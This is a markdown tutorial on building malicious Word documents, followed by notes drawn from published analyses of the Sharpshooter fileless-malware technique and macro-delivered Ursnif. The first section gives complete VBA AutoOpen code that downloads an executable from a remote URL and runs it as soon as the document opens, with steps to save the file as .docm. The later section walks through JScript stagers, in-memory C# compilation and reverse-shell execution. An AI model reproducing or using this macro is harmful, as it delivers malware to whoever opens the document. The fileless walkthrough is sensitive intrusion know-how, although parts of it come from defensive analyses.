# Creating Word Macros to AutoRun Downloader via Word Document

https://www.sciencedirect.com/science/article/pii/S1353485817300491
https://screwnomore.wordpress.com/2015/11/06/creating-malicious-word-macros-tutorial-autorun-stub-via-word-document/
https://www.vba-market.com/2018/01/02/vba-run-time-error-2146697208-800c0008-the-download-of-the-specified-resource-has-failed/

Alt+F11 in MS Word or

![](https://i.imgur.com/NmBdUZn.png)

![](https://i.imgur.com/nvvcP5z.png)

Then Double click on ThisDocument

![](https://i.imgur.com/28Hk2dn.png)

Paste this code into the field that appears

```
Sub AutoOpen()

Dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.3.0")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Reciept.exe", False
xHttp.Send

With bStrm
 .Type = 1 '//binary
 .Open
 .write xHttp.responseBody
 .savetofile "file.exe", 2 '//overwrite
End With

Shell ("file.exe")

End Sub
```

Now just save the file as filename.docm


## fileless payload
https://countercept.com/blog/analyzing-sharpshooter-part-1/
https://cloudblogs.microsoft.com/microsoftsecure/2018/09/27/out-of-sight-but-not-invisible-defeating-fileless-malware-with-behavior-monitoring-amsi-and-next-gen-av/
https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/kovter-an-evolving-malware-gone-fileless

1. An HTML web page that drops the stager onto a victim’s host machine;
2. A JScript/HTA/VBS stager. (In this post we will be using the JScript stager that connects back to the attacker’s machine, then downloads and executes C# code using DotNetToJavaScript. Sharpshooter provides two download mechanisms web delivery and DNS delivery. We will be analysing how Sharpshooter performs its web delivery.)
3. A C# source code file that will be downloaded, compiled and executed in memory. (In our example, we will be using an msfvenom Windows reverse Shell payload.)

![](https://i.imgur.com/XC3xSxt.png)

### Stager
The JScript file contains a series of encrypted JScript commands within it. When the file is executed, these commands are dynamically decrypted and executed at runtime. Among these decrypted commands are the dotNetToJscript (Forshaw, 2017) commands to serialize and execute the .NET assembly. These are shown in the following snippets: 

![](https://i.imgur.com/NlWrfIE.png)

Serialized_obj is a variable that contains a base 64 encoded serialized .NET assembly, which can be de-serialized and executed at run time. This .NET assembly correspond to a Sharpshooter class upon de-serialization.  

![](https://i.imgur.com/ub8fqWS.png)

The code snippet above shows a series of JScript commands that encompass the dotNetToJscript technique. These commands do the following:

De-serialize the Sharpshooter class by leveraging .NET BinaryFormatter, a class commonly used for remote procedure calls;  
Upon de-serialization, it will load the Sharpshooter class into memory.
With the Sharpshooter class loaded into memory, a new Sharpshooter object can be created from the class. With it created, we can now run its function calls:

![](https://i.imgur.com/BFuZlLW.png)

### Execution (pre-compilation)
Now that a new Sharpshooter object is loaded in memory, the attacker’s first task would be to make use of the new object’s functions to connect back to his machine to download the malicious C# source code into memory. This C# code can contain either a payload generated by mfsvenom or self-crafted by the attacker; as mentioned previously, we will be using a Windows reverse shell. The following snippets of code will show how the C# code is downloaded, compiled, and loaded into memory.

![](https://i.imgur.com/6sMK9Yr.png)

Headers and configuration information are first set, we can see the default User-Agent is Firefox.

![](https://i.imgur.com/otSAIP7.png)

Then the “DownloadString” function is used to download the payload into Sharpshooter’s process memory.

![](https://i.imgur.com/NZTeZ8a.png)

Subsequently, .NET CodeDomProvider library is used to compile the source code in memory.

![](https://i.imgur.com/vEz3gV9.png)

Thereafter, .NET reflection library would then be used to retrieve the compiled code’s program and main function. With the retrieved information, Sharpshooter is able to invoke the main function causing the MSFvenom payload to be executed.

### Execution (post-compilation)
As the reverse shell payload is in its raw assembly format, it can be directly executed by Windows (commonly referred to as “unmanaged code” in .NET). In order to execute the payload, Sharpshooter makes use of “VirtualAlloc” which allows it to allocate executable memory to hold the payload.   

![](https://i.imgur.com/qqkpgjc.png)

The code above reserves a large enough memory region within the Sharpshooter’s process region to hold our reverse shell payload.     

![](https://i.imgur.com/pGMCDnB.png)

Next, the reverse shell payload is written to the memory region that we previously allocated above. 

![](https://i.imgur.com/nAdM4CU.png)

![](https://i.imgur.com/iHMP2XA.png)

### Sample from Microsoft with macro

The Sharpshooter technique allows an attacker to use a script to execute a .NET binary directly from memory without ever needing to reside on the disk. This technique provides a framework that can enable attackers to easily repackage the same binary payload within a script. As demonstrated by the example of the two scripts, files that use the Sharpshooter technique can then be used in social engineering attacks to lure users into running the script to deliver a fileless payload.

![](https://i.imgur.com/Ce0PV6o.png)

This is the dynamic log generated by the scripts and detected by Windows Defender ATP at runtime via AMSI:

![](https://i.imgur.com/OLS8Nat.png)

these samples decode and execute the same .js script payload, a known downloader:

![](https://i.imgur.com/oGtyRSX.png)

The obfuscated macro code attempts to run an obfuscated Cmd command which in turns executes an obfuscated Powershell script. In the end, the Ursnif trojan is delivered.

![](https://i.imgur.com/j6cswOa.png)
